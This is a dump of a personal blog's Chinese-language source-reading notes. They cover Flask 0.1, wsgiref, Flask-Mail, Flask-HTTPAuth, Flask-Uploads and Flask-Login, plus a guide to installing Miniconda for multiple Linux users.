v.s. url_adapter url_map 为 Werkzeug Map实例，记录端点与URL规则映射。而 url_map 通过调用 .bind_to_envrion 返回 url_adapter，url_adapter 根据端点调用 .bind() 可以构建出对应的URL。\nurl_map用于记录映射，url_adapter 负责反查、或者构造URL。前者无请求信息，后者绑定了请求信息。\n1 2 3 4 5 6 7 8 9 10 11  class _RequestContext(object): def __init__(self, app, environ): self.app = app # url_map 属性是一个Map对象，它调用 bind_to_environ() 方法， # 返回一个MapAdapter类实例。此实例负责匹配和构建URL self.url_adapter = app.url_map.bind_to_environ(environ) def url_for(endpoint, **values): # 根据传入的端点返回对应的URL return _request_ctx_stack.top.url_adapter.build(endpoint, values)   实际应用实例处理请求时\n 通过 url_adapter 调用 .match() 查询出当前请求对应的端点、视图参数 根据查询出的端点调用对应的视图函数处理请求  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Flask(object): # ... def __init__(self, package_name): ... # url_map 为 Werkzeug Map实例，存储URL规则及相关配置 # 主要通过存储 Rule 实例，保存了端点和URL规则的映射 self.url_map = Map() def match_request(self): rv = _request_ctx_stack.top.url_adapter.match() request.endpoint, request.view_args = rv return rv def dispatch_request(self): try: endpoint, values = self.match_request() return self.view_functions[endpoint](**values) ...   Local, LocalProxy, LocalStack 这一部分其实不了解也能读懂整个Flask流程，只记住一下一些概念即可，有兴趣可以看源码深究。可以参看 李辉 的《Flask Web开发实战》书中最后一章。\n目前推荐先阅读之后的几版源码，弄清楚后来一些特性的实现。\nLocal Flask为了应对多线程处理，引入了本地线程（Thread Local）的概念，在保存数据的同时记录下对应的线程ID，获取数据时根据所在线程的ID即可获取到对应的数据。（简单地说，虽然所有线程看来在使用一个全局对象，实际上每个线程使用的是全局对象下当前线程对应的同名变量）\nPython内置模块 threading.local 就是对于本地线程的一种实现。\n根据 Werkzeug，threading.local 存在一些限制，不能满足其项目需求。\n This (threading.local) approach, however, has a few disadvantages. For example, besides threads, there are other types of concurrency in Python. A very popular one is greenlets. Also, whether every request gets its own thread is not guaranteed in WSGI. It could be that a request is reusing a thread from a previous request, and hence data is left over in the thread local object.\n 于是，Werkzeug 基于 greenlet 实现本地线程 Local 类，其覆盖性更好。\nLocalProxy 代理（Proxy）是一种设计模式，通过创建一个代理对象。我们可以使用这个代理对象来操作实际对象。乍一看，你可能会觉得 Flask 吃饱撑的不用 Local 而要通过 LocalProxy 套一层。\n因为上下文的推送和移除是动态进行的，Flask 使用代理可以让我们拥有动态获取上下文对象的能力。 另外，一个动态的全局对象，也让多个程序实例并存有了可能。这样在不同的程序上下文环境中，current_app 总是能对应正确的程序实例。\nLocalStack LocalStack 只是基于 Local 实现的栈结构。\n为什么 Flask 使用 LocalStack 而不是直接使用 Local 存储上下文对象。主要的原因是为了支持多程序共存。将程序分离成多个程序很类似蓝本的模块化分离，但它们并不是一回事。使用Werkzeug提供的 DispatcherMiddleware 中间件就可以把多个程序组合成一个WSGI程序运行。\nReferences  Flask on GitHub Werkzueg: Context Locals 《Flask Web开发实战》，李辉 ","permalink":"https://blog.pseudocold.com/post/2019/flask-0.1/","tags":["flask"],"title":"Flask 0.1 源码解读"},{"categories":["Code Reading"],"contents":"wsgiref 源码阅读个人笔记， 不做解读。\nReferences\n PEP 3333，先了解 WSGI wsgiref doc wsgiref 源码解析  TODO\n 阅读 Flask 源码后重新梳理  Python内置WSGI服务器：wsgiref。仅供开发及测试。\nversion: Python 3.6.9\n1 2 3 4 5 6 7 8  ❯ tree wsgiref wsgiref ├── __init__.py ├── handlers.py ├── headers.py ├── simple_server.py ├── util.py └── validate.py   源码只看两部分: simple_server.py, handlers.py。这两部分实现了WSGI服务端。simple_server.py中demo_app为WSGI应用端的简单实现。其他文件类似于这2者的辅助函数。\n流程总结，参考源码解析博文\n 服务器程序创建 socket，并监听在特定的端口，等待客户端的连接 客户端发送 http 请求 socket server 读取请求的数据，交给 http server http server 根据 http 的规范解析请求，然后把请求交给 WSGIServer WSGIServer 把客户端的信息存放在 environ 变量里，然后交给绑定的 handler 处理请求 HTTPHandler 解析请求，把 method、path 等放在 environ，然后 WSGIRequestHandler 把服务器端的信息也放到 environ 里 WSGIRequestHandler 调用绑定的 wsgi ServerHandler，把上面包含了服务器信息，客户端信息，本次请求信息得 environ 传递过去。（ServerHandler解析wsgi.相关环境变量） wsgi ServerHandler 调用注册的 wsgi app，把 environ 和 start_response 传递过去 wsgi app 将reponse header、status、body 回传给 wsgi handler 然后 handler 逐层传递，最后把这些信息通过 socket 发送到客户端 客户端的程序接到应答，解析应答，并把结果打印出来。  模块使用样码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # server.py # 从wsgiref模块导入: from wsgiref.simple_server import make_server # 导入我们自己编写的application函数: # from hello import application # handler.py WSGI 处理函数 def application(environ, start_response): start_response(\u0026#39;200 OK\u0026#39;, [(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/html\u0026#39;)]) return [b\u0026#39;\u0026lt;h1\u0026gt;Hello, web!\u0026lt;/h1\u0026gt;\u0026#39;] # 创建一个服务器，IP地址为空，端口是8000，处理函数是application: httpd = make_server(\u0026#39;\u0026#39;, 8000, application) print(\u0026#39;Serving HTTP on port 8000...\u0026#39;) # 开始监听HTTP请求: httpd.serve_forever()   init.py 代码说明\nwsgiref \u0026ndash; a WSGI (PEP 3333) Reference Library\nCurrent Contents:\n util \u0026ndash; Miscellaneous useful functions and wrappers headers \u0026ndash; Manage response headers handlers \u0026ndash; base classes for server/gateway implementations simple_server \u0026ndash; a simple BaseHTTPServer that supports WSGI validate \u0026ndash; validation wrapper that sits between an app and a server to detect errors in either  To-Do:\n cgi_gateway \u0026ndash; Run WSGI apps under CGI (pending a deployment standard) cgi_wrapper \u0026ndash; Run CGI apps under WSGI router \u0026ndash; a simple middleware component that handles URL traversal  simple_server.py 基于http.server模块中BaseHTTPRequestHandler, HTTPServer实现HTTP服务监听。Python 2中对应BaseHTTPServer对应于Python 3中http.server。配合wsgiref 源码解析阅读较好。\n http.server doc, 只了解上边2个类的使用即可  直接运行simple_server.py文件，可以开启一个样例app，输出所有环境变量。StringIO对象被用来做缓冲，一次返回所有数据给WSGI服务端。\nBaseHTTPRequestHandler\n rfile\nAn io.BufferedIOBase input stream, ready to read from the start of the optional input data.\n 1 2 3 4 5 6  # handler in class WSGIRequestHandler(BaseHTTPRequestHandler) handler = ServerHandler( # from handlers.py self.rfile, self.wfile, self.get_stderr(), self.get_environ() ) handler.request_handler = self # backpointer for logging handler.run(self.server.get_app())   调用默认浏览器打开URL。\n1 2  import webbrowser webbrowser.open(\u0026#39;http://localhost:8000/xyz?abc\u0026#39;)   utils.py 没什么好说的，扫一眼每个函数的文档说明即可明白各个函数在做什么。在handlers.py中会被用到。\nheaders.py 类，用来存储响应头，在start_response中被调用。\nhandlers.py WSGI服务端实现。不需要全部理解，着重查看run和start_response函数。前者对应于simple_server.py中handler.run()，后者属于WSGI标准。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class BaseHandler: # ... def run(self, application): \u0026#34;\u0026#34;\u0026#34;Invoke the application\u0026#34;\u0026#34;\u0026#34; # Note to self: don\u0026#39;t move the close()! Asynchronous servers shouldn\u0026#39;t # call close() from finish_response(), so if you close() anywhere but # the double-error branch here, you\u0026#39;ll break asynchronous servers by # prematurely closing. Async servers must return from \u0026#39;run()\u0026#39; without # closing if there might still be output to iterate over. try: self.setup_environ() self.result = application(self.environ, self.start_response) self.finish_response() except: try: self.handle_error() except: # If we get an error handling an error, just give up already! self.close() raise # ...and let the actual server figure it out.   ","permalink":"https://blog.pseudocold.com/post/2019/wsigref-code-reading/","tags":["flask"],"title":"wsigref 源码阅读笔记"},{"categories":["DevOps","CLI"],"contents":"在 Linux 中脚本安装 Anaconda/Miniconda 使所有人均可调用。需要 sudo 权限。\n使用 root 安装（sudo），安装目录选择 /opt/miniconda3.\n关于如何共享，有两个方案：\n 安装文件夹对于非 root 用户可读、可访问，但不可写入。这样规避了 pkgs cache, envs 共享带来的安全隐患。 安装文件夹对于非 root 用户可读、可访问，但不可写入。pkgs cache, envs 对应子目录对于所有人可写，这样共享环境、缓存，节省了空间。  Install Miniconda in Command Line 1 2 3  wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O ~/miniconda.sh # bash ~/miniconda.sh -b -p $HOME/miniconda sudo bash ~/miniconda.sh -b -p /opt/miniconda3    -b, batch mode. No PATH modification in shell init files. -p, installation prefix. -f, force even prefix already exists.  安装路径对于所有人可读 1 2  sudo chown -R root:root /opt/miniconda3 sudo chmod -R go-w+rX /opt/miniconda3   Put the env variables file into /etc/profile.d.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # /etc/profile.d/miniconda3.sh _conda_installation_names=( miniconda miniconda2 miniconda3 anaconda anaconda2 anaconda2 ) for i in ${_conda_installation_names[@]}; do [ -d \u0026#34;/opt/${i}/condabin\u0026#34; ] \u0026amp;\u0026amp; PATH=\u0026#34;/opt/${i}/condabin:${PATH}\u0026#34; done export PATH unset _conda_installation_names # Note: `conda init` script may add the condabin into PATH again, # which doesn\u0026#39;t impact the usage of `conda` the command. # Avoid overriding users\u0026#39; custom values [ -z \u0026#34;$CONDA_PKGS_DIRS\u0026#34; ] \u0026amp;\u0026amp; export CONDA_PKGS_DIRS=\u0026#34;$HOME/.conda/pkgs\u0026#34; [ -z \u0026#34;$CONDA_ENVS_PATH\u0026#34; ] \u0026amp;\u0026amp; export CONDA_ENVS_PATH=\u0026#34;$HOME/.conda/envs\u0026#34;   共享安装目录下的缓存、环境 Sharing files with others may compromise your system.\n利用 set group ID，ACL 控制权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13  sudo chown -R root:root /opt/miniconda3 sudo chmod -R go-w+rX /opt/miniconda3 sudo find /opt/miniconda3/{envs,pkgs} -type d -exec chmod 777 {} + sudo find /opt/miniconda3/{envs,pkgs} -type f -exec chmod go+rw {} + # use group \u0026#34;users\u0026#34; but not \u0026#34;root\u0026#34;, optional # set group id and fix perm of folers envs,pkgs sudo chown -R root:users /opt/miniconda3/{envs,pkgs} sudo chmod 2777 /opt/miniconda3/{envs,pkgs} sudo setfacl -d -m g::rwX /opt/miniconda3/{envs,pkgs} sudo setfacl -d -m o::rwX /opt/miniconda3/{envs,pkgs}   References  How to set default file permissions for all folders/files in a directory? Access Control Lists from Arch Wiki Multi User Anaconda Installation on Linux – Anaconda Knowledge Base Installing Anaconda in silent mode ","permalink":"https://blog.pseudocold.com/post/2018/miniconda-multi-user-installation/","tags":["conda","linux","macos"],"title":" Multi User Anaconda/Miniconda Installation"},{"categories":["Flask","Code Reading"],"contents":"Flask-Mail 扩展源码内容实际和 Flask 关系不大，主要是封装 Python 内置 email 库来发送邮件。我的第一直觉是跳过这个模块源码。不过，这时候我突然想到一个问题，Flask-Mail 发送邮件为什么需要应用上下文？每个教程都这么告诉我，但却没有解释过原因。\n主要源码文件\n1  flask_mail.py   为何 Flask-Mail 需要上下文 基本所有教程中都会提到，Flask-Mail发送邮件需要应用上下文，但是为啥？以一段常见的利用线程发送邮件防止阻断请求的代码为例，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  def send_async_email(app, msg): with app.app_context(): try: mail.send(msg) except Exception as e: # TODO: handler mail exception pass def send_mail(to, subject, template, **kw): app = current_app._get_current_object() msg = Message( app.config[\u0026#34;FISHER_MAIL_SUBJECT_PREFIX\u0026#34;] + \u0026#34; \u0026#34; + subject, sender=app.config[\u0026#34;FISHER_MAIL_SENDER\u0026#34;], recipients=[to], ) msg.html = render_template(template + \u0026#34;.html\u0026#34;, **kw) thr = Thread(target=send_async_email, args=[app, msg]) thr.start() return thr   发送邮件不就是需要发送人、收件人、邮件主体、附件吗？上面 send_mail 函数已经拿到了这些玩意儿。\n仔细想想，还差一点：SMTP 地址以及 SMTP 服务器验证信息。而这些信息是我们在 Flask 实例创建时将配置绑定到了应用实例上，所以可以推断 Flask-Mail 至少需要从应用实例拿到这些配置。\n为了验证这种假设，直接查看 Mail 类代码中 init_app 部分。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  class Mail(_MailMixin): \u0026#34;\u0026#34;\u0026#34;Manages email messaging :param app: Flask instance \u0026#34;\u0026#34;\u0026#34; def __init__(self, app=None): self.app = app if app is not None: self.state = self.init_app(app) else: self.state = None def init_mail(self, config, debug=False, testing=False): return _Mail( config.get(\u0026#39;MAIL_SERVER\u0026#39;, \u0026#39;127.0.0.1\u0026#39;), config.get(\u0026#39;MAIL_USERNAME\u0026#39;), config.get(\u0026#39;MAIL_PASSWORD\u0026#39;), config.get(\u0026#39;MAIL_PORT\u0026#39;, 25), config.get(\u0026#39;MAIL_USE_TLS\u0026#39;, False), config.get(\u0026#39;MAIL_USE_SSL\u0026#39;, False), config.get(\u0026#39;MAIL_DEFAULT_SENDER\u0026#39;), int(config.get(\u0026#39;MAIL_DEBUG\u0026#39;, debug)), config.get(\u0026#39;MAIL_MAX_EMAILS\u0026#39;), config.get(\u0026#39;MAIL_SUPPRESS_SEND\u0026#39;, testing), config.get(\u0026#39;MAIL_ASCII_ATTACHMENTS\u0026#39;, False) ) def init_app(self, app): \u0026#34;\u0026#34;\u0026#34;Initializes your mail settings from the application settings. You can use this if you want to set up your Mail instance at configuration time. :param app: Flask application instance \u0026#34;\u0026#34;\u0026#34; state = self.init_mail(app.config, app.debug, app.testing) # register extension with app app.extensions = getattr(app, \u0026#39;extensions\u0026#39;, {}) app.extensions[\u0026#39;mail\u0026#39;] = state return state def __getattr__(self, name): return getattr(self.state, name, None)   果不其然，查看 init_app, init_mail 与 Flask 的耦合非常低，只是作为扩展从 Flask 实例获取配置。也就是说，Flask 基本只充当了注册中心。（你他娘的真是个天才！这么屁大点的事儿就把自己声明成了 Flask 扩展。）\n而其中唯一的 current_app 调用，也仅仅是为了创建一个相关 signal，把当前邮件发送完成的信息传递出去。\nReferences  SMTP发送邮件 by liaoxuefeng flask-mail doc flask-mail source code ","permalink":"https://blog.pseudocold.com/post/2019/flask-mail/","tags":["flask","flask-mail"],"title":"为何 Flask-Mail 需要上下文环境"},{"categories":["Code Reading"],"contents":"flask-httpauth 源码阅读个人笔记， 不做解读。\nReferences\n Flask-HTTPAuth doc，最初出现于狗书中RESTFul API认证。由于 Flask-Login 默认使用 session，为了在无状态 API 避免麻烦转而采用Flask-HTTPAuth. Flask-HTTPAuth source Flask扩展系列(九)–HTTP认证  3.2.4\n1 2  # 单一文件源码 flask_httpauth.py   Flask-HTTPAuth 封装了众多的装饰器，用来针对不同验证类型，配置不同验证函数。\n注：HTTP认证基于请求头Authentication，详情参考《HTTP权威指南》。\n.login_required, .error_handler分别对应为登录验证，验证失败响应函数的装饰器。\nflask_httpauth.py scheme参数不可随便设置，有规定。\n Basic Digest Bearer（非标准，自定义即可）, for HTTPTokenAuth 前两者直接被Werkzeug存储到request.authorization，其他在get_auth()自行获取  realm参数仅在HTTPDigestAuth中参与验证。其他类中只被用于在错误处理时返回响应头中的质询WWW-Authenticate，说明验证位置，提示对方使用对应验证。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class HTTPAuth(object): # ... def error_handler(self, f): @wraps(f) def decorated(*args, **kwargs): res = f(*args, **kwargs) res = make_response(res) if res.status_code == 200: # if user didn\u0026#39;t set status code, use 401 res.status_code = 401 if \u0026#39;WWW-Authenticate\u0026#39; not in res.headers.keys(): res.headers[\u0026#39;WWW-Authenticate\u0026#39;] = self.authenticate_header() return res def authenticate_header(self): return \u0026#39;{0}realm=\u0026#34;{1}\u0026#34;\u0026#39;.format(self.scheme, self.realm)   WWW-Authenticate质询状态码为401 Unauthorized。\nHTTPAuth 基类 __init__()，设置回调函数.get_password_callback, .auth_error_callback.\nget_password(), 返回回调函数。\nerror_handler装饰器，调用.auth_error_callback记录的函数，通过响应头WWW-Authenticate提示对方验证。\nget_auth()，从请求头Authorization获取认证信息，调用werkzeug.datastructures.Authorization()返回auth实例。\nget_auth_password(), 调用 .get_password_callback(auth.username) 获取密码。\nlogin_required()\n 跳过 OPTIONS get_auth_password(auth) authenticate(auth, password) 进行验证  1 2 3 4 5 6 7  if request.method != \u0026#39;OPTIONS\u0026#39;: # pragma: no cover password = self.get_auth_password(auth) if not self.authenticate(auth, password): # Clear TCP receive buffer of any pending data request.data return self.auth_error_callback()   username(), get username from request.authorization.username.\nHTTPBasicAuth 请求头Authorization: Baisc base64-username:passwd，username:password进行Base64编码。\nBase64编码主要别用来移除国际字符和非法字符。\nhash_password(), verify_password 装饰器，注册回调函数为 HTTPBasicAuth 实例属性。\nauthenticate(self, auth, stored_password)验证顺序\n verify_password_callback(auth.username, auth.password) 直接校验 对比auth.password与传入的 stored_password  可选hash_password_callback(auth.password)哈希处理auth中传入的密码    注：传入参数stored_password通过self.get_auth_password(auth)，调用get_password_callback获取。也就是说要么单独使用@verify_password，要么使用@hash_password, @get_password结合使用。\n1 2 3 4 5 6 7  if self.verify_password_callback: return self.verify_password_callback(username, client_password) if not auth: return False if self.hash_password_callback: try: client_password = self.hash_password_callback(client_password)   HTTPDigestAuth 参考《HTTP权威指南》p309 摘要的计算一节。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  HTTP/1.1 401 Unauthorized WWW-Authenticate: Digest realm=\u0026#34;Shopping Cart\u0026#34; nonce=\u0026#39;random-string\u0026#39; qop=\u0026#34;auth,auth-int\u0026#34; # 可选：提供保护质量选项 GET /url HTTP/1.1 Authorization: Digest username=\u0026#34;username\u0026#34; realm=\u0026#34;Shopping Cart\u0026#34; nonce=\u0026#34;copy the received nonce\u0026#34; response=\u0026#34;string\u0026#34; qop=\u0026#34;auth\u0026#34; # 开始可选：执行对称认证，要求服务器验证自己身份 nc=0000001, # nonce number cnonce=\u0026#34;s\u0026#34; # optinal, client nonce, 客户端发起验证质询   验证成功后服务器响应中，Authentication-Info为可选。\nqop, quality of protection.\n auth, \u0026lt;request-method\u0026gt;:\u0026lt;uri-directive-value\u0026gt; auth-init, 在auth基础上加入了请求报文实体的主体的摘要。 有助于方法、资源或者报文被篡改  散列是对于报文实体主体，即传输编码前数据，进行散列。\nFlask-HTTPAuth 中摘要认证没有考虑qop.\nHTTPTokenAuth @verify_token装饰器，回调函数接受token值。\nauth['token']由Authorization请求头中获取。\nMultiAuth 封装多个 additional_auth ，依次尝试，最后回落到 main_auth.\n由源码可以，第一参数为回落main_auth，后面列表参数优先。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  class MultiAuth(object): def __init__(self, main_auth, *args): self.main_auth = main_auth self.additional_auth = args # ... else: for auth in self.additional_auth: if auth.scheme == scheme: selected_auth = auth break if selected_auth is None: selected_auth = self.main_auth   examples, tests 参考二者可以学习此库的使用。\nbin/makechangelog.py 自commit中提取提交信息，建立超链接，写入changelog。不错的Python脚本编程参考。\n","permalink":"https://blog.pseudocold.com/post/2019/flask-httpauth-code-reading/","tags":["flask"],"title":"Flask HTTPAuth 源码阅读笔记"},{"categories":["Code Reading"],"contents":"flask-uploads 源码阅读个人笔记， 不做解读。\nReferences\n flask-uploads source flask-uploads doc  0.2.0，貌似一直没有更新。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  flask-uploads ├── docs ├── example │ ├── static │ │ └── style.css │ ├── templates │ │ ├── index.html │ │ ├── layout.html │ │ ├── login.html │ │ └── new.html │ └── photolog.py ├── LICENSE ├── MANIFEST.in ├── README.md ├── flask_uploads.py ├── setup.py ├── tests.py └── tox.ini   结构简单，调用flask.send_from_directory返回文件，werkzeud.secure_filename处理文件名。\n总结 基于MIME过滤上传文件 文件类型判断基于后缀名，感觉不是很可靠。建议实际使用时，文件信息到数据库，并在此时确认mimetype. 文件类型信息可能在之后处理时需要，如生成图片缩略图需要确定上传的文件是否为图片。\n参考《Python Web开发实战》董明伟，做文件类型判断。uploaded_file.mimetype.\n建议扩展UploadSet类，添加self.mimetypes元组，重载file_allowed()函数做MIME类型判断。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # Flask-Uploads源码自带 IMAGES = tuple(\u0026#39;jpg jpe jpeg png gif svg bmp\u0026#39;.split()) # 自定义 IMAGE_MIMES = [ \u0026#39;image/x-icon\u0026#39;, \u0026#39;image/svg+xml\u0026#39;, \u0026#39;image/jpeg\u0026#39;, \u0026#39;image/gif\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/webp\u0026#39;, ] class UploadImageSet(UploadSet): self.mimetypes = IMAGE_MIMES def file_allowed(storage, basename): extension_allowed = self.extension_allowed(extension(basename)) mimetype_allowed = storage.mimetype in self.mimetypes return extension_allowed and mimetype_allowed   storage 文 request.files 字典中的文件对象，为 FileStorage 实例。\nfile_allowed()函数在 .save() 保存文件时调用，作为上传文件过滤。\n文件存储名 UplaodSet.save()采用上传文件的.filename作为保存名，通过添加 _N 数字后缀避免文件名冲突。\n建议替换为 uuid.uuid4().hex 随机值作为文件名，保存时传入 save(fileObj, name=\u0026quot;random-string\u0026quot;) 保存文件。name 值以 . 结尾时，save() 重用上传文件对象的文件后缀。\nos.path.splitext(filename) 始终返回二元元组，即后缀名可以为空。\n配置说明 UPLOADED_PHOTOS_DEST, UPLOADED_PHOTOS_URL, UPLOADED_PHOTOS_ALLOW, UPLOADED_PHOTOS_DENY 中 PHOTOS 为 set 组名。也就是说可以定义多个组，分别存放不同的文件类型。每个组有如上4个配置。\nUPLOADED_PHOTOS_URL 要加 / 后缀。\ndest存储位置，url 访问链接最终会回落到 UPLOADS_DEFAULT_DEST, UPLOADS_DEFAULT_URL.\nflask_uploads.py patch_request_class() 限制文件大小 patch_request_class(app, size=64 * 1024 * 1024). Use MAX_CONTENT_LENGTH settings instead in Flask \u0026gt;= 0.6.\n While Werkzeug switches uploads from memory to a temporary file when they hit 500 KiB,\nit\u0026rsquo;s still possible for someone to overload your disk space with a gigantic file.\n It patches werkzeug.BaseRequest.max_content_length attribute to limit the file size.\npatch_request_class(app, size=None). 传入None参数以调用MAX_CONTENT_LENGTH参数。\n_uploads 蓝图 1 2 3 4 5 6 7 8 9 10  uploads_mod = Blueprint(\u0026#39;_uploads\u0026#39;, __name__, url_prefix=\u0026#39;/_uploads\u0026#39;) # 视图 _uploads.uploaded_file 对应URL /_uploads/\u0026lt;setname\u0026gt;/\u0026lt;filename\u0026gt; # 路径部分 `_uploads` 可以被 UPLOADS_DEFAULT_DEST 代替 @uploads_mod.route(\u0026#39;/\u0026lt;setname\u0026gt;/\u0026lt;path:filename\u0026gt;\u0026#39;) def uploaded_file(setname, filename): config = current_app.upload_set_config.get(setname) if config is None: abort(404) return send_from_directory(config.destination, filename)   configure_uploads() 配置上传组 configure_uploads(app, upload_sets)\n 从app.config字典中加载配置，依次配置每个upload set 的  dest base_url allowed and denied extensions   每个 upload set 配置存储到UploadConfiguration实例 最终存储在app.upload_set_config['set-name']，set name 为 UploadSet()传入的组名 注册蓝图做文件服务，/_uploads  UploadSet 类 UploadSet class\n__init__(self, name='files', extensions=DEFAULTS, default_dest=None)\n.config属性，返回当前上传组的配置信息\n.url(filename)，返回文件访问链接 \u0026lt;base_url\u0026gt;/\u0026lt;filename\u0026gt;，回落到/_uploads/\u0026lt;setname\u0026gt;/\u0026lt;filename\u0026gt;。\npath(self, filename, folder=None), 返回存储路径。若folder不为空，则假定folder值作为目标目录下的子目录。\nfile_allowed(storage, basename)实际为检查扩展名，判断当前文件是否允许被上传。storage为werkzueg.FileStorage实例，也就是request.files字典中上传的文件对象，可以自己扩展此检测函数。\nfile_allowed()函数在 .save() 保存文件时调用，作为上传文件过滤。\nget_basename(filename)，调用werkzeug.utils.secure_filename()移除非ASCII字符，转换后缀名小写。\nsave(self, storage, folder=None, name=None)，保存上传的文件对象storage\n storage类型判断，保证传入的对象为werkzeug.FileStorage实例 判断 name 是否带有 /，拆分出 folder 子文件夹名 self.file_allowed()，判断文件是否被当前上传组UploadSet允许 拼接保存路径，确保文件夹存在，解决同名冲突，保存文件 返回文件相对于 self.config.destination 的相对路径  resolve_confilict() 内部使用函数，通过在 filename_without_ext 后添加 _N 数字后缀，避免重名。\n","permalink":"https://blog.pseudocold.com/post/2019/flask-uploads-code-reading/","tags":["flask"],"title":"Flask-Uploads 源码阅读笔记"},{"categories":["Code Reading"],"contents":"flask-login 源码阅读个人笔记， 不做解读。\nversion: 0.4.1\n1 2 3 4 5 6 7 8 9  flask_login ├── __about__.py ├── __init__.py ├── _compat.py ├── config.py ├── login_manager.py ├── mixins.py ├── signals.py └── utils.py   TODO\n Flask-Login 通过 session 记录登录状态，阅读完 Flask 源码后再次梳理此插件源码  References  flask-login doc  current_user from utils.py current_user is a LocalProxy(from werkzeug) instance. important\ncalls utils._get_user(), which get user obj from _request_ctx_stack.top.user. When _request_ctx_stack.top.user is not set. Set it with LoginManager._load_user().\nLoginManager._load_user()\n update session fresheness according session freshness mode (basic, or strong) if \u0026lsquo;user_id\u0026rsquo; is missing from session, load user obj into _request_ctx_stack.top.user from cookies, or from request, or from header. if \u0026lsquo;user_id\u0026rsquo; is set in session, load user obj from session['user_id'] by calling reload_user  utils.py current_user is a LocalProxy(from werkzeug) instance. important\nwerkzeug.security.safe_str_cmp\n This function compares strings in somewhat constant time. This requires that the length of at least one string is known in advance.\n login_user()\n 记录user_id等信息到session 用户对象存储在_request_ctx_stack.top.user. 发送用户登录信号  logout_user，与以上相反\n 自session pop出登录信息 LoginManager.reload_user()重新登录用户，此处结果为修改_request_ctx_stack.top.user为匿名用户实例  confirm_login，set session status as \u0026ldquo;fresh\u0026rdquo;. Sessions become stale when they\u0026rsquo;re loaded from a cookie.\n session['_fresh'] = True  decorators\n login_required, current_user.is_authenticated or not  could be disabled by LOGIN_DISABLED config   fresh_login_required, check if user is .is_authenticated and session fresh  inner use methods\n _cookie_digest: return hmac.new(key, payload.encode('utf-8'), sha512).hexdigest(), generated with SECRET_KEY. _create_identifier, create user identifier with their User-Agent and ip address (X-Forwarded-For). return hexdigest generated by sha512()  mixins.py UserMixin with attr\n is_active, True is_authenticated, True is_anonymous, False get_id(), return id of the model instance  AnonymousUserMixin\nlogin_manager.py LoginManager\n不建议定义本地化字符串回调函数，还要自己实现（检测用于语言偏好，返回对应提示信息），直接使用现成工具，Flask-Babel。术业有专攻。而且，多语言支持都是站点级别的多语言支持，只实现登录提示信息的多语言支持没有意义。\n一般没必要使用refresh，即跳转页面让用户重新授权，标记session为\u0026quot;fresh\u0026quot;。如果是论坛，恐怕只需要在修改密码时要求已登录用户再次验证（输入密码），直接在对应页面表单中要求填写密码即可。如果类似再验证需求较多时，再考虑分离验证到refresh。\nattrs\n blueprint_login_views, dict stores login views/functions for blueprints. .user_callback, custom func used to get user obj. default None (not enabled). unauthorized_callback, custom callback/error handler, not enabled by default. ._session_identifier_generator, utils._create_identifier()  methods\n init_app()  bind LoginManger instance to app.login_manager call _update_remember_cookie after each request inject current_user (LocalProxy) into context.   unathorized(), handler for views requires auth  send signal get login_view (for app, or for a blueprint) flash a login message (inform the user to login before current action) make_login_url, get url from login_view string redirect user to the login url   needs_refresh()，跳转到重新验证（密码验证）页面，流程与上面类似。一般用不到。 reload_user()，刷新请求上下文的栈顶中的用户对象（此处存储的即为current_user）  据session['user_id']获取用户对象 重新设置_request_ctx_stack.top.user存储的用户实例，未登录时设置为AnonymouseUserMixin实例    helpers\n user_loader, set callback to load user from the session. takes an user ID (unicode) returns an user object. 通过装饰器注册用户实例加载函数。在reload_user()中调用注册的回调函数。 header_loader, set callback to load user from a header value (take an auth token). deprecated request_loader, set callback to loader user from a Flask request unauthorized_handler, set handler used by login_required decorator, takes no arguments. returns a response. needs_refresh_handler, set handler used by fresh_login_required decorator, takes no argument. returns a response.  _load_user(): .login_required装饰器检查current_user.is_authenticated属性。而current_user通过LoginManager._load_user()依次检查\n cookie name REMEMBER_COOKIE_NAME 是否存在于cookies中。LoginManager._load_from_cookie从cookies中获得user_id，调用LoginManager.user_callback加载用户对象到_request_ctx_stack.top.user self.request_callback函数存在，LoginManager._load_from_request调用此回调函数，加载用户对象 AUTH_HEADER_NAME 键存在于 request.haeders时，调用LoginManager._load_from_header  inner used methods\n _load_user(), important, used when retrieving current_user.  Loads user from session or remember_me cookie as applicable call _session_protection, update session freshness according to session mode (basic or strong), update \u0026lsquo;_fresh\u0026rsquo; or \u0026lsquo;remember\u0026rsquo; in session. reload_user if needed (may required by session freshness change) if \u0026lsquo;user_id\u0026rsquo; is missing from session, load user obj into _request_ctx_stack.top.user with  _load_from_cookie, or fallbacks to _load_from_request, or fallbacks to _load_from_header   else, load user obj from session['user_id'] by calling reload_user   _update_remember_cookie, important, called after each request. Check \u0026lsquo;remember\u0026rsquo; in session and refresh login status (cookies on the client about login duration info).  _set_cookie, used to update login expiration after each request. 调用utils.encode_cookie, 实际为基于SECRET_KEY的hmac摘要。   _clear_cookie, clear cookies about login info (duration/expiration info)  流程梳理 current_user，在utils.py中可见，current为一个LocalProxy，通过utils._get_user()加载其到当地代理。\nutils._get_user被调用时，先尝试检测_request_ctx_stack_top.user，若不存在，则调用LoginManager._load_user()检测session，若失效，reload_user被调用自session中查找user_id，加载用户，或加载返回一个匿名用户实例。\n在LoginManager实例初始化.init_app()时，通过调用app.context(utils._user_context_processor)。将current_user注册到上下文中，全局可用。\n用户实例或者继承自UserMixin，或者为匿名用户。多出了一些登录相关属性:\n is_authenticated is_active is_anonymous get_id()  